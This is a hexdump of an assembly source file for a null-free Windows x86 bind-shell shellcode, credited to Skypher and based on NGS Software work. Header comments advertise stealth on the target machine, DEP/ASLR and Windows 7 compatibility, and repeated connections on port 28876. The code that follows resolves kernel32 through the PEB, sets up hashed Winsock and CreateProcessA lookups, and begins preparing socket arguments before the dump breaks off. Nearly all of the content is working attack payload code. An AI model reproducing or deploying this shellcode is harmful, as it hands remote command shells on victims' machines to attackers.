00000000  42 49 54 53 20 33 32 0d  0a 3b 20 57 69 6e 64 6f  |BITS 32..; Windo|
00000010  77 73 20 78 38 36 20 6e  75 6c 6c 2d 66 72 65 65  |ws x86 null-free|
00000020  20 62 69 6e 64 73 68 65  6c 6c 20 66 6f 72 20 57  | bindshell for W|
00000030  69 6e 64 6f 77 73 20 35  2e 30 2d 36 2e 30 20 61  |indows 5.0-6.0 a|
00000040  6c 6c 20 73 65 72 76 69  63 65 20 70 61 63 6b 73  |ll service packs|
00000050  2e 0d 0a 3b 20 28 53 65  65 20 68 74 74 70 3a 2f  |...; (See http:/|
00000060  2f 73 6b 79 70 68 65 72  2e 63 6f 6d 2f 77 69 6b  |/skypher.com/wik|
00000070  69 2f 69 6e 64 65 78 2e  70 68 70 2f 48 61 63 6b  |i/index.php/Hack|
00000080  69 6e 67 2f 53 68 65 6c  6c 63 6f 64 65 2f 42 69  |ing/Shellcode/Bi|
00000090  6e 64 2f 4e 47 53 29 2e  0d 0a 3b 20 42 61 73 65  |nd/NGS)...; Base|
000000a0  64 20 6c 61 72 67 65 6c  79 20 6f 6e 20 63 6f 64  |d largely on cod|
000000b0  65 20 61 6e 64 20 69 64  65 61 73 20 28 43 29 20  |e and ideas (C) |
000000c0  32 30 30 35 20 62 79 20  44 61 66 79 64 64 20 53  |2005 by Dafydd S|
000000d0  74 75 74 74 61 72 64 2c  20 4e 47 53 20 53 6f 66  |tuttard, NGS Sof|
000000e0  74 77 61 72 65 2e 0d 0a  3b 20 28 53 65 65 20 68  |tware...; (See h|
000000f0  74 74 70 3a 2f 2f 77 77  77 2e 6e 67 73 73 6f 66  |ttp://www.ngssof|
00000100  74 77 61 72 65 2e 63 6f  6d 2f 70 61 70 65 72 73  |tware.com/papers|
00000110  2f 57 72 69 74 69 6e 67  53 6d 61 6c 6c 53 68 65  |/WritingSmallShe|
00000120  6c 6c 63 6f 64 65 2e 70  64 66 29 2e 0d 0a 3b 20  |llcode.pdf)...; |
00000130  54 68 61 6e 6b 73 20 74  6f 20 50 65 74 65 20 42  |Thanks to Pete B|
00000140  65 63 6b 2e 0d 0a 3b 0d  0a 3b 20 46 65 61 74 75  |eck...;..; Featu|
00000150  72 65 73 20 62 6f 74 68  20 69 6e 20 74 68 69 73  |res both in this|
00000160  20 61 6e 64 20 74 68 65  20 6f 72 69 67 69 6e 61  | and the origina|
00000170  6c 20 63 6f 64 65 3a 0d  0a 3b 20 20 2b 20 4e 55  |l code:..;  + NU|
00000180  4c 4c 20 46 72 65 65 0d  0a 3b 20 20 2b 20 57 69  |LL Free..;  + Wi|
00000190  6e 64 6f 77 73 20 76 65  72 73 69 6f 6e 20 61 6e  |ndows version an|
000001a0  64 20 73 65 72 76 69 63  65 20 70 61 63 6b 20 69  |d service pack i|
000001b0  6e 64 65 70 65 6e 64 61  6e 74 2e 0d 0a 3b 20 49  |ndependant...; I|
000001c0  6d 70 72 6f 76 65 6d 65  6e 74 73 20 6f 66 20 74  |mprovements of t|
000001d0  68 69 73 20 63 6f 64 65  20 6f 76 65 72 20 74 68  |his code over th|
000001e0  65 20 6f 72 69 67 69 6e  61 6c 3a 0d 0a 3b 20 20  |e original:..;  |
000001f0  2b 20 4e 6f 20 61 73 73  75 6d 70 74 69 6f 6e 73  |+ No assumptions|
00000200  20 61 72 65 20 6d 61 64  65 20 61 62 6f 75 74 20  | are made about |
00000210  74 68 65 20 76 61 6c 75  65 73 20 6f 66 20 72 65  |the values of re|
00000220  67 69 73 74 65 72 73 2e  0d 0a 3b 20 20 2b 20 22  |gisters...;  + "|
00000230  2f 33 47 42 22 20 63 6f  6d 70 61 74 69 62 6c 65  |/3GB" compatible|
00000240  3a 20 70 6f 69 6e 74 65  72 73 20 61 72 65 20 6e  |: pointers are n|
00000250  6f 74 20 61 73 73 75 6d  65 20 74 6f 20 62 65 20  |ot assume to be |
00000260  73 6d 61 6c 6c 65 72 20  74 68 61 6e 20 30 78 38  |smaller than 0x8|
00000270  30 30 30 30 30 30 30 2e  0d 0a 3b 20 20 2b 20 44  |0000000...;  + D|
00000280  45 50 2f 41 53 4c 52 20  63 6f 6d 70 61 74 69 62  |EP/ASLR compatib|
00000290  6c 65 3a 20 64 61 74 61  20 69 73 20 6e 6f 74 20  |le: data is not |
000002a0  65 78 65 63 75 74 65 64  2c 20 63 6f 64 65 20 69  |executed, code i|
000002b0  73 20 6e 6f 74 20 6d 6f  64 69 66 69 65 64 2e 0d  |s not modified..|
000002c0  0a 3b 20 20 2b 20 57 69  6e 64 6f 77 73 20 37 20  |.;  + Windows 7 |
000002d0  63 6f 6d 70 61 74 69 62  6c 65 3a 20 6b 65 72 6e  |compatible: kern|
000002e0  65 6c 33 32 20 69 73 20  66 6f 75 6e 64 20 62 61  |el32 is found ba|
000002f0  73 65 64 20 6f 6e 20 74  68 65 20 6c 65 6e 67 74  |sed on the lengt|
00000300  68 20 6f 66 20 69 74 73  20 6e 61 6d 65 2e 0d 0a  |h of its name...|
00000310  3b 20 20 2b 20 53 74 65  61 6c 74 68 3a 20 64 6f  |;  + Stealth: do|
00000320  65 73 20 6e 6f 74 20 64  69 73 70 6c 61 79 20 61  |es not display a|
00000330  20 63 6f 6e 73 6f 6c 65  20 77 69 6e 64 6f 77 73  | console windows|
00000340  20 6f 6e 20 74 68 65 20  74 61 72 67 65 74 20 6d  | on the target m|
00000350  61 63 68 69 6e 65 20 77  68 65 6e 20 0d 0a 3b 20  |achine when ..; |
00000360  20 20 20 63 6d 64 2e 65  78 65 20 69 73 20 65 78  |   cmd.exe is ex|
00000370  65 63 75 74 65 64 2e 0d  0a 3b 20 20 2b 20 41 6c  |ecuted...;  + Al|
00000380  6c 6f 77 73 20 61 6e 20  75 6e 6c 69 6d 69 74 65  |lows an unlimite|
00000390  64 20 6e 75 6d 62 65 72  20 6f 66 20 63 6f 6e 73  |d number of cons|
000003a0  65 63 75 74 69 76 65 20  63 6f 6e 6e 65 63 74 69  |ecutive connecti|
000003b0  6f 6e 73 2e 0d 0a 3b 20  20 2b 20 43 61 6e 20 65  |ons...;  + Can e|
000003c0  78 63 65 70 74 20 63 6f  6e 6e 65 63 74 69 6f 6e  |xcept connection|
000003d0  73 20 6f 6e 20 61 6c 6d  6f 73 74 20 61 6e 79 20  |s on almost any |
000003e0  70 6f 72 74 2e 20 54 68  65 20 72 61 6e 67 65 20  |port. The range |
000003f0  6f 66 20 61 63 63 65 70  74 61 62 6c 65 20 70 6f  |of acceptable po|
00000400  72 74 0d 0a 3b 20 20 20  20 6e 75 6d 62 65 72 73  |rt..;    numbers|
00000410  20 69 73 20 6f 6e 6c 79  20 6c 69 6d 69 74 65 64  | is only limited|
00000420  20 62 79 20 74 68 65 20  66 61 63 74 20 74 68 61  | by the fact tha|
00000430  74 20 74 68 65 20 6e 65  67 61 74 69 76 65 20 76  |t the negative v|
00000440  61 6c 75 65 20 6f 66 20  74 68 65 20 70 6f 72 74  |alue of the port|
00000450  0d 0a 3b 20 20 20 20 6e  75 6d 62 65 72 20 6d 75  |..;    number mu|
00000460  73 74 20 6e 6f 74 20 63  6f 6e 74 61 69 6e 20 6e  |st not contain n|
00000470  75 6c 6c 73 2e 0d 0a 0d  0a 70 6f 72 74 20 65 71  |ulls.....port eq|
00000480  75 20 32 38 38 37 36 20  20 20 20 20 20 20 20 20  |u 28876         |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004a0  20 3b 20 54 68 65 20 70  6f 72 74 20 6e 75 6d 62  | ; The port numb|
000004b0  65 72 20 74 6f 20 62 69  6e 64 20 74 6f 2e 0d 0a  |er to bind to...|
000004c0  0d 0a 25 69 66 20 28 28  2d 70 6f 72 74 20 26 20  |..%if ((-port & |
000004d0  30 78 46 46 29 20 3d 3d  20 30 29 20 7c 7c 20 28  |0xFF) == 0) || (|
000004e0  2d 70 6f 72 74 20 26 20  30 78 46 46 30 30 20 3d  |-port & 0xFF00 =|
000004f0  3d 20 30 29 0d 0a 20 20  25 65 72 72 6f 72 20 54  |= 0)..  %error T|
00000500  68 65 20 67 69 76 65 6e  20 70 6f 72 74 20 6e 75  |he given port nu|
00000510  6d 62 65 72 20 77 6f 75  6c 64 20 72 65 73 75 6c  |mber would resul|
00000520  74 20 69 6e 20 4e 55 4c  4c 73 20 69 6e 20 74 68  |t in NULLs in th|
00000530  65 20 63 6f 64 65 20 3a  28 0d 0a 25 65 6e 64 69  |e code :(..%endi|
00000540  66 0d 0a 0d 0a 41 46 5f  49 4e 45 54 20 20 20 20  |f....AF_INET    |
00000550  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000560  20 20 20 20 20 20 20 20  20 20 20 20 20 65 71 75  |             equ|
00000570  20 32 0d 0a 0d 0a 3b 20  54 68 65 73 65 20 68 61  | 2....; These ha|
00000580  73 68 65 73 20 61 72 65  20 63 61 6c 63 75 6c 61  |shes are calcula|
00000590  74 65 64 20 77 69 74 68  20 61 20 73 65 70 61 72  |ted with a separ|
000005a0  61 74 65 20 74 6f 6f 6c  2e 0d 0a 68 61 73 68 5f  |ate tool...hash_|
000005b0  6b 65 72 6e 65 6c 33 32  5f 43 72 65 61 74 65 50  |kernel32_CreateP|
000005c0  72 6f 63 65 73 73 41 20  20 20 20 20 20 20 20 20  |rocessA         |
000005d0  20 20 20 65 71 75 20 30  78 38 31 0d 0a 68 61 73  |   equ 0x81..has|
000005e0  68 5f 6b 65 72 6e 65 6c  33 32 5f 4c 6f 61 64 4c  |h_kernel32_LoadL|
000005f0  69 62 72 61 72 79 41 20  20 20 20 20 20 20 20 20  |ibraryA         |
00000600  20 20 20 20 20 65 71 75  20 30 78 35 39 0d 0a 68  |     equ 0x59..h|
00000610  61 73 68 5f 77 73 32 5f  33 32 5f 57 53 41 53 74  |ash_ws2_32_WSASt|
00000620  61 72 74 75 70 20 20 20  20 20 20 20 20 20 20 20  |artup           |
00000630  20 20 20 20 20 20 20 65  71 75 20 30 78 44 33 0d  |       equ 0xD3.|
00000640  0a 68 61 73 68 5f 77 73  32 5f 33 32 5f 57 53 41  |.hash_ws2_32_WSA|
00000650  53 6f 63 6b 65 74 20 20  20 20 20 20 20 20 20 20  |Socket          |
00000660  20 20 20 20 20 20 20 20  20 65 71 75 20 30 78 36  |         equ 0x6|
00000670  32 0d 0a 68 61 73 68 5f  77 73 32 5f 33 32 5f 62  |2..hash_ws2_32_b|
00000680  69 6e 64 20 20 20 20 20  20 20 20 20 20 20 20 20  |ind             |
00000690  20 20 20 20 20 20 20 20  20 20 20 65 71 75 20 30  |           equ 0|
000006a0  78 33 30 0d 0a 68 61 73  68 5f 77 73 32 5f 33 32  |x30..hash_ws2_32|
000006b0  5f 6c 69 73 74 65 6e 20  20 20 20 20 20 20 20 20  |_listen         |
000006c0  20 20 20 20 20 20 20 20  20 20 20 20 20 65 71 75  |             equ|
000006d0  20 30 78 32 30 0d 0a 68  61 73 68 5f 77 73 32 5f  | 0x20..hash_ws2_|
000006e0  33 32 5f 61 63 63 65 70  74 20 20 20 20 20 20 20  |32_accept       |
000006f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 65  |               e|
00000700  71 75 20 30 78 34 31 0d  0a 73 69 7a 65 6f 66 5f  |qu 0x41..sizeof_|
00000710  70 72 6f 63 5f 61 64 64  72 65 73 73 5f 74 61 62  |proc_address_tab|
00000720  6c 65 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |le              |
00000730  20 65 71 75 20 37 20 2a  20 34 0d 0a 6f 66 66 73  | equ 7 * 4..offs|
00000740  65 74 5f 57 53 41 53 74  61 72 74 75 70 5f 69 6e  |et_WSAStartup_in|
00000750  5f 68 61 73 68 5f 74 61  62 6c 65 20 20 20 20 20  |_hash_table     |
00000760  20 20 20 20 65 71 75 20  32 0d 0a 0d 0a 25 64 65  |    equ 2....%de|
00000770  66 69 6e 65 20 42 32 57  28 62 31 2c 62 32 29 20  |fine B2W(b1,b2) |
00000780  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000790  20 20 20 20 20 28 28 28  62 32 29 20 3c 3c 20 38  |     (((b2) << 8|
000007a0  29 20 2b 20 28 62 31 29  29 0d 0a 25 64 65 66 69  |) + (b1))..%defi|
000007b0  6e 65 20 57 32 44 57 28  77 31 2c 77 32 29 20 20  |ne W2DW(w1,w2)  |
000007c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000007d0  20 20 20 28 28 28 77 32  29 20 3c 3c 20 31 36 29  |   (((w2) << 16)|
000007e0  20 2b 20 28 77 31 29 29  0d 0a 25 64 65 66 69 6e  | + (w1))..%defin|
000007f0  65 20 42 32 44 57 28 62  31 2c 62 32 2c 62 33 2c  |e B2DW(b1,b2,b3,|
00000800  62 34 29 20 20 20 20 20  20 20 20 20 20 20 20 20  |b4)             |
00000810  20 20 28 28 28 62 34 29  20 3c 3c 20 32 34 29 20  |  (((b4) << 24) |
00000820  2b 20 28 28 62 33 29 20  3c 3c 20 31 36 29 20 2b  |+ ((b3) << 16) +|
00000830  20 28 28 62 32 29 20 3c  3c 20 38 29 20 2b 20 28  | ((b2) << 8) + (|
00000840  62 31 29 29 0d 0a 0d 0a  73 74 61 72 74 3a 0d 0a  |b1))....start:..|
00000850  20 20 20 20 58 4f 52 20  20 20 20 20 45 43 58 2c  |    XOR     ECX,|
00000860  20 45 43 58 20 20 20 20  20 20 20 20 20 20 20 20  | ECX            |
00000870  20 20 20 20 20 20 20 20  3b 20 45 43 58 20 3d 20  |        ; ECX = |
00000880  30 0d 0a 3b 20 46 69 6e  64 20 62 61 73 65 20 61  |0..; Find base a|
00000890  64 64 72 65 73 73 20 6f  66 20 6b 65 72 6e 65 6c  |ddress of kernel|
000008a0  33 32 2e 64 6c 6c 2e 20  54 68 69 73 20 63 6f 64  |32.dll. This cod|
000008b0  65 20 73 68 6f 75 6c 64  20 77 6f 72 6b 20 6f 6e  |e should work on|
000008c0  20 57 69 6e 64 6f 77 73  20 35 2e 30 2d 37 2e 30  | Windows 5.0-7.0|
000008d0  0d 0a 20 20 20 20 4d 4f  56 20 20 20 20 20 45 53  |..    MOV     ES|
000008e0  49 2c 20 5b 46 53 3a 45  43 58 20 2b 20 30 78 33  |I, [FS:ECX + 0x3|
000008f0  30 5d 20 20 20 20 20 20  20 20 3b 20 45 53 49 20  |0]        ; ESI |
00000900  3d 20 26 28 50 45 42 29  20 28 5b 46 53 3a 30 78  |= &(PEB) ([FS:0x|
00000910  33 30 5d 29 0d 0a 20 20  20 20 4d 4f 56 20 20 20  |30])..    MOV   |
00000920  20 20 45 53 49 2c 20 5b  45 53 49 20 2b 20 30 78  |  ESI, [ESI + 0x|
00000930  30 43 5d 20 20 20 20 20  20 20 20 20 20 20 3b 20  |0C]           ; |
00000940  45 53 49 20 3d 20 50 45  42 2d 3e 4c 64 72 0d 0a  |ESI = PEB->Ldr..|
00000950  20 20 20 20 4d 4f 56 20  20 20 20 20 45 53 49 2c  |    MOV     ESI,|
00000960  20 5b 45 53 49 20 2b 20  30 78 31 43 5d 20 20 20  | [ESI + 0x1C]   |
00000970  20 20 20 20 20 20 20 20  3b 20 45 53 49 20 3d 20  |        ; ESI = |
00000980  50 45 42 2d 3e 4c 64 72  2e 49 6e 49 6e 69 74 4f  |PEB->Ldr.InInitO|
00000990  72 64 65 72 20 28 66 69  72 73 74 20 6d 6f 64 75  |rder (first modu|
000009a0  6c 65 29 0d 0a 6e 65 78  74 5f 6d 6f 64 75 6c 65  |le)..next_module|
000009b0  3a 0d 0a 20 20 20 20 4d  4f 56 20 20 20 20 20 45  |:..    MOV     E|
000009c0  42 50 2c 20 5b 45 53 49  20 2b 20 30 78 30 38 5d  |BP, [ESI + 0x08]|
000009d0  20 20 20 20 20 20 20 20  20 20 20 3b 20 45 42 50  |           ; EBP|
000009e0  20 3d 20 49 6e 49 6e 69  74 4f 72 64 65 72 5b 58  | = InInitOrder[X|
000009f0  5d 2e 62 61 73 65 5f 61  64 64 72 65 73 73 0d 0a  |].base_address..|
00000a00  20 20 20 20 4d 4f 56 20  20 20 20 20 45 44 49 2c  |    MOV     EDI,|
00000a10  20 5b 45 53 49 20 2b 20  30 78 32 30 5d 20 20 20  | [ESI + 0x20]   |
00000a20  20 20 20 20 20 20 20 20  3b 20 45 44 49 20 3d 20  |        ; EDI = |
00000a30  49 6e 49 6e 69 74 4f 72  64 65 72 5b 58 5d 2e 6d  |InInitOrder[X].m|
00000a40  6f 64 75 6c 65 5f 6e 61  6d 65 20 28 75 6e 69 63  |odule_name (unic|
00000a50  6f 64 65 20 73 74 72 69  6e 67 29 0d 0a 20 20 20  |ode string)..   |
00000a60  20 4d 4f 56 20 20 20 20  20 45 53 49 2c 20 5b 45  | MOV     ESI, [E|
00000a70  53 49 5d 20 20 20 20 20  20 20 20 20 20 20 20 20  |SI]             |
00000a80  20 20 20 20 20 3b 20 45  53 49 20 3d 20 49 6e 49  |     ; ESI = InI|
00000a90  6e 69 74 4f 72 64 65 72  5b 58 5d 2e 66 6c 69 6e  |nitOrder[X].flin|
00000aa0  6b 20 28 6e 65 78 74 20  6d 6f 64 75 6c 65 29 0d  |k (next module).|
00000ab0  0a 20 20 20 20 43 4d 50  20 20 20 20 20 5b 45 44  |.    CMP     [ED|
00000ac0  49 20 2b 20 31 32 2a 32  5d 2c 20 43 4c 20 20 20  |I + 12*2], CL   |
00000ad0  20 20 20 20 20 20 20 20  20 3b 20 6d 6f 64 75 6c  |         ; modul|
00000ae0  65 6e 61 6d 65 5b 31 32  5d 20 3d 3d 20 30 20 3f  |ename[12] == 0 ?|
00000af0  20 73 74 72 6c 65 6e 28  22 6b 65 72 6e 65 6c 33  | strlen("kernel3|
00000b00  32 2e 64 6c 6c 22 29 20  3d 3d 20 31 32 0d 0a 20  |2.dll") == 12.. |
00000b10  20 20 20 4a 4e 45 20 20  20 20 20 6e 65 78 74 5f  |   JNE     next_|
00000b20  6d 6f 64 75 6c 65 20 20  20 20 20 20 20 20 20 20  |module          |
00000b30  20 20 20 20 20 20 20 3b  20 4e 6f 3a 20 74 72 79  |       ; No: try|
00000b40  20 6e 65 78 74 20 6d 6f  64 75 6c 65 2e 0d 0a 0d  | next module....|
00000b50  0a 3b 20 43 72 65 61 74  65 20 68 61 73 68 20 74  |.; Create hash t|
00000b60  61 62 6c 65 20 61 6e 64  20 22 77 73 32 5f 33 32  |able and "ws2_32|
00000b70  22 20 28 66 6f 72 20 4c  6f 61 64 4c 69 62 72 61  |" (for LoadLibra|
00000b80  72 79 41 29 20 6f 6e 20  74 68 65 20 73 74 61 63  |ryA) on the stac|
00000b90  6b 3a 0d 0a 20 20 20 20  50 55 53 48 20 20 20 20  |k:..    PUSH    |
00000ba0  42 59 54 45 20 27 32 27  20 20 20 20 20 20 20 20  |BYTE '2'        |
00000bb0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 53 74  |            ; St|
00000bc0  61 63 6b 20 3d 20 22 32  22 0d 0a 20 20 20 20 50  |ack = "2"..    P|
00000bd0  55 53 48 20 20 20 20 42  32 44 57 28 27 73 27 2c  |USH    B2DW('s',|
00000be0  20 27 32 27 2c 20 27 5f  27 2c 20 27 33 27 29 20  | '2', '_', '3') |
00000bf0  20 20 20 3b 20 53 74 61  63 6b 20 3d 20 22 73 32  |   ; Stack = "s2|
00000c00  5f 33 32 22 0d 0a 20 20  20 20 50 55 53 48 20 20  |_32"..    PUSH  |
00000c10  20 20 42 32 44 57 28 68  61 73 68 5f 77 73 32 5f  |  B2DW(hash_ws2_|
00000c20  33 32 5f 62 69 6e 64 2c  20 68 61 73 68 5f 77 73  |32_bind, hash_ws|
00000c30  32 5f 33 32 5f 6c 69 73  74 65 6e 2c 20 68 61 73  |2_32_listen, has|
00000c40  68 5f 77 73 32 5f 33 32  5f 61 63 63 65 70 74 2c  |h_ws2_32_accept,|
00000c50  20 27 77 27 29 20 3b 20  68 61 73 68 2c 20 68 61  | 'w') ; hash, ha|
00000c60  73 68 2c 20 22 77 73 32  5f 33 32 22 0d 0a 65 6e  |sh, "ws2_32"..en|
00000c70  64 5f 6f 66 5f 68 61 73  68 5f 74 61 62 6c 65 5f  |d_of_hash_table_|
00000c80  6d 61 72 6b 65 72 20 20  20 20 20 20 20 20 20 20  |marker          |
00000c90  20 20 20 20 20 20 65 71  75 20 27 77 27 0d 0a 20  |      equ 'w'.. |
00000ca0  20 20 20 50 55 53 48 20  20 20 20 42 32 44 57 28  |   PUSH    B2DW(|
00000cb0  68 61 73 68 5f 6b 65 72  6e 65 6c 33 32 5f 43 72  |hash_kernel32_Cr|
00000cc0  65 61 74 65 50 72 6f 63  65 73 73 41 2c 20 68 61  |eateProcessA, ha|
00000cd0  73 68 5f 6b 65 72 6e 65  6c 33 32 5f 4c 6f 61 64  |sh_kernel32_Load|
00000ce0  4c 69 62 72 61 72 79 41  2c 20 68 61 73 68 5f 77  |LibraryA, hash_w|
00000cf0  73 32 5f 33 32 5f 57 53  41 53 74 61 72 74 75 70  |s2_32_WSAStartup|
00000d00  2c 20 68 61 73 68 5f 77  73 32 5f 33 32 5f 57 53  |, hash_ws2_32_WS|
00000d10  41 53 6f 63 6b 65 74 29  0d 0a 73 69 7a 65 6f 66  |ASocket)..sizeof|
00000d20  5f 68 61 73 68 5f 74 61  62 6c 65 20 20 20 20 20  |_hash_table     |
00000d30  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d40  20 20 65 71 75 20 37 0d  0a 20 20 20 20 4d 4f 56  |  equ 7..    MOV|
00000d50  20 20 20 20 20 45 53 49  2c 20 45 53 50 20 20 20  |     ESI, ESP   |
00000d60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d70  20 3b 20 45 53 49 20 2d  3e 20 48 61 73 68 20 74  | ; ESI -> Hash t|
00000d80  61 62 6c 65 0d 0a 3b 20  52 65 73 65 72 76 65 20  |able..; Reserve |
00000d90  73 70 61 63 65 20 66 6f  72 20 57 53 41 44 41 54  |space for WSADAT|
00000da0  41 0d 0a 20 20 20 20 4d  4f 56 20 20 20 20 20 43  |A..    MOV     C|
00000db0  48 2c 20 30 78 33 20 20  20 20 20 20 20 20 20 20  |H, 0x3          |
00000dc0  20 20 20 20 20 20 20 20  20 20 20 3b 20 45 43 58  |           ; ECX|
00000dd0  20 3d 20 30 78 33 30 30  0d 0a 20 20 20 20 53 55  | = 0x300..    SU|
00000de0  42 20 20 20 20 20 45 53  50 2c 20 45 43 58 20 20  |B     ESP, ECX  |
00000df0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000e00  20 20 3b 20 52 65 73 65  72 76 65 20 73 70 61 63  |  ; Reserve spac|
00000e10  65 20 66 6f 72 20 57 53  41 44 41 54 41 0d 0a 3b  |e for WSADATA..;|
00000e20  20 43 72 65 61 74 65 20  61 20 62 75 6e 63 68 20  | Create a bunch |
00000e30  6f 66 20 4e 55 4c 4c 73  20 6f 6e 20 74 68 65 20  |of NULLs on the |
00000e40  73 74 61 63 6b 0d 0a 20  20 20 20 53 55 42 20 20  |stack..    SUB  |
00000e50  20 20 20 45 53 50 2c 20  45 43 58 20 20 20 20 20  |   ESP, ECX     |
00000e60  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00000e70  20 52 65 73 65 72 76 65  20 73 70 61 63 65 20 66  | Reserve space f|
00000e80  6f 72 20 4e 55 4c 4c 73  0d 0a 20 20 20 20 4d 4f  |or NULLs..    MO|
00000e90  56 20 20 20 20 20 45 44  49 2c 20 45 53 50 20 20  |V     EDI, ESP  |
00000ea0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000eb0  20 20 3b 20 45 44 49 20  3d 20 26 28 4e 55 4c 4c  |  ; EDI = &(NULL|
00000ec0  73 29 0d 0a 20 20 20 20  53 41 4c 43 20 20 20 20  |s)..    SALC    |
00000ed0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000ee0  20 20 20 20 20 20 20 20  20 20 20 20 3b 20 41 4c  |            ; AL|
00000ef0  20 3d 20 30 0d 0a 20 20  20 20 52 45 50 20 53 54  | = 0..    REP ST|
00000f00  4f 53 42 20 20 20 20 20  20 20 20 20 20 20 20 20  |OSB             |
00000f10  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 0d  |              ;.|
00000f20  0a 3b 20 50 72 65 70 61  72 65 20 61 72 67 75 6d  |.; Prepare argum|
00000f30  65 6e 74 73 20 66 6f 72  20 76 61 72 69 6f 75 73  |ents for various|
00000f40  20 66 75 6e 63 74 69 6f  6e 73 20 6f 6e 20 74 68  | functions on th|
00000f50  65 20 73 74 61 63 6b 3a  0d 0a 3b 20 57 53 41 53  |e stack:..; WSAS|
00000f60  6f 63 6b 65 74 28 5f 5f  69 6e 20 69 6e 74 20 61  |ocket(__in int a|
00000f70  66 3d 32 2c 20 5f 5f 69  6e 20 69 6e 74 20 74 79  |f=2, __in int ty|
00000f80  70 65 3d 31 2c 20 5f 5f  69 6e 20 69 6e 74 20 70  |pe=1, __in int p|
00000f90  72 6f 74 6f 63 6f 6c 3d  30 2c 0d 0a 3b 20 20 20  |rotocol=0,..;   |
00000fa0  20 20 20 20 20 20 20 20  20 5f 5f 69 6e 20 4c 50  |         __in LP|
00000fb0  57 53 41 50 52 4f 54 4f  43 4f 4c 5f 49 4e 46 4f  |WSAPROTOCOL_INFO|
00000fc0  20 6c 70 50 72 6f 74 6f  63 6f 6c 49 6e 66 6f 3d  | lpProtocolInfo=|
00000fd0  30 2c 20 5f 5f 69 6e 20  47 52 4f 55 50 20 67 3d  |0, __in GROUP g=|
00000fe0  30 2c 20 0d 0a 3b 20 20  20 20 20 20 20 20 20 20  |0, ..;          |
00000ff0  20 20 5f 5f 69 6e 20 44  57 4f 52 44 20 64 77 46  |  __in DWORD dwF|
00001000  6c 61 67 73 3d 30 29 0d  0a 20 20 20 20 20 20 20  |lags=0)..       |
00001010  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001030  20 3b 20 5f 5f 69 6e 20  4c 50 57 53 41 50 52 4f  | ; __in LPWSAPRO|
00001040  54 4f 43 4f 4c 5f 49 4e  46 4f 20 6c 70 50 72 6f  |TOCOL_INFO lpPro|
00001050  74 6f 63 6f 6c 49 6e 66  6f 3d 30 0d 0a 20 20 20  |tocolInfo=0..   |
00001060  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00001080  20 20 20 20 20 3b 20 5f  5f 69 6e 20 47 52 4f 55  |     ; __in GROU|
00001090  50 20 67 3d 30 0d 0a 20  20 20 20 20 20 20 20 20  |P g=0..         |
000010a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000010b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
000010c0  20 5f 5f 69 6e 20 44 57  4f 52 44 20 64 77 46 6c  | __in DWORD dwFl|
000010d0  61 67 73 3d 30 0d 0a 20  20 20 20 20 20 20 20 20  |ags=0..         |
000010e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000010f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
00001100  20 5f 5f 69 6e 20 69 6e  74 20 70 72 6f 74 6f 63  | __in int protoc|
00001110  6f 6c 3d 30 0d 0a 20 20  20 20 49 4e 43 20 20 20  |ol=0..    INC   |
00001120  20 20 45 43 58 20 20 20  20 20 20 20 20 20 20 20  |  ECX           |
00001130  20 20 20 20 20 20 20 20  20 20 20 20 20 20 3b 0d  |              ;.|
00001140  0a 20 20 20 20 50 55 53  48 20 20 20 20 45 43 58  |.    PUSH    ECX|
00001150  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001160  20 20 20 20 20 20 20 20  20 3b 20 5f 5f 69 6e 20  |         ; __in |
00001170  69 6e 74 20 74 79 70 65  20 3d 20 53 4f 43 4b 5f  |int type = SOCK_|
00001180  53 54 52 45 41 4d 20 28  31 29 0d 0a 20 20 20 20  |STREAM (1)..    |
00001190  49 4e 43 20 20 20 20 20  45 43 58 20 20 20 20 20  |INC     ECX     |
000011a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000011b0  20 20 20 20 3b 0d 0a 20  20 20 20 50 55 53 48 20  |    ;..    PUSH |
000011c0  20 20 20 45 43 58 20 20  20 20 20 20 20 20 20 20  |   ECX          |
000011d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 3b  |               ;|
000011e0  20 5f 5f 69 6e 20 69 6e  74 20 61 66 20 3d 20 41  | __in int af = A|
000011f0  46 5f 49 4e 45 54 20 28  32 29 0d 0a 3b 20 57 53  |F_INET (2)..; WS|
00001200  41 53 74 61 72 74 75 70  28 5f 5f 69 6e 20 57 4f  |AStartup(__in WO|
00001210  52 44 20 77 56 65 72 73  69 6f 6e 52 65 71 75 65  |RD wVersionReque|
00001220  73 74 65 64 3d 32 2c 20  5f 5f 6f 75 74 20 4c 50  |sted=2, __out LP|
00001230  57 53 41 44 41 54 41 20  6c 70 57 53 41 44 41 54  |WSADATA lpWSADAT|
00001240  61 3d 73 74 61 63 6b 29  0d 0a 20 20 20 20 50 55  |a=stack)..    PU|
00001250  53 48 20 20 20 20 45 44  49 20 20 20 20 20 20 20  |SH    EDI       |
00001260  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00001270  20 20 3b 20 5f 5f 6f 75  74 20 4c 50 57 53 41 44  |  ; __out LPWSAD|
00001280  41 54 41 20 6c 70 57 53  41 44 61 74 61 20 3d 20  |ATA lpWSAData = |
